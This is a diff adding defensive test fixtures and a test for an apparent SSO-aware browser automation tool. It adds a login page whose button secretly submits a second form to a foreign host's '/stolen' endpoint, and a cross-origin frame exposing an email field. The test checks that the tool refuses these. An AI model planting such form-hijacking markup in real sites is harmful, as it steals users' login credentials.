@@ -242,6 +242,14 @@ def _pages(port, port2):
         "/saml-post": ("text/html", b'<html><head><title>POST data</title></head><body><form method="post" action="/logged">'
                                     b'<input type="hidden" name="SAMLResponse" value="PHNhbWw+"><button>Continue</button>'
                                     b'</form></body></html>'),
+        # round 14: a checkbox on top + a cross-origin frame with an e-mail field (screenshot must be refused);
+        # a login form whose fallback button submits ANOTHER form (form="other") to a foreign host
+        "/shot-xemail": ("text/html", f'<html><head><title>Article</title></head><body><input type="checkbox">'
+                                      f'<iframe src="http://127.0.0.1:{port2}/xemail" width="300" height="80"></iframe></body></html>'.encode()),
+        "/sso-otherform": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
+            '<button type="submit" id="login">登录 / Login</button>',
+            f'<button form="other" id="login">登录 / Login</button>').replace(
+            "</form>", f'</form><form id="other" method="post" action="http://127.0.0.1:{port2}/stolen"></form>').encode()),
         "/wayf-form": ("text/html", b'<html><head><title>Find your institution</title></head><body><form method="post" '
                                     b'action="/logged"><input type="search" name="q" aria-label="Search for your institution">'
                                     b'<button>Find</button></form></body></html>'),
@@ -258,7 +266,8 @@ def _pages(port, port2):
 
 
 # the second (foreign) origin; every request it gets is recorded (a request for /stolen is a leak)
-XPAGES = {"/xframe": ("text/html", XFRAME.encode())}
+XPAGES = {"/xframe": ("text/html", XFRAME.encode()),
+          "/xemail": ("text/html", b'<html><body><input type="email" name="em" value="SECRETMAIL@x.org"></body></html>')}
 XHITS: list = []
 
 
@@ -1085,5 +1094,21 @@ def test_round8_sso_verification_page_is_not_submitted(origins):
         p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
         line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R8 "))
         assert json.loads(line[3:]) == {"refused": "verification page on the SSO login page", "stage": "pre"}, line
+    finally:
+        _finish(sp)
+
+
+def test_round14_screenshot_coverage_and_sso_other_form(origins):
+    sp = "tbsgen-test-r14"
+    try:
+        assert _run(sp, "open", origins[0] + "/shot-xemail", handoff=False)["status"] == "ok"
+        r = _run(sp, "screenshot", handoff=False)
+        assert r["status"] == "refused" and not r.get("shot"), r
+        XHITS.clear()
+        assert _run(sp, "open", origins[2] + "/sso-otherform")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "refused" and r["sso_submitted"] is False and r["sso_stage"] == "pre", r
+        time.sleep(1)
+        assert "/stolen" not in XHITS, XHITS
     finally:
         _finish(sp)
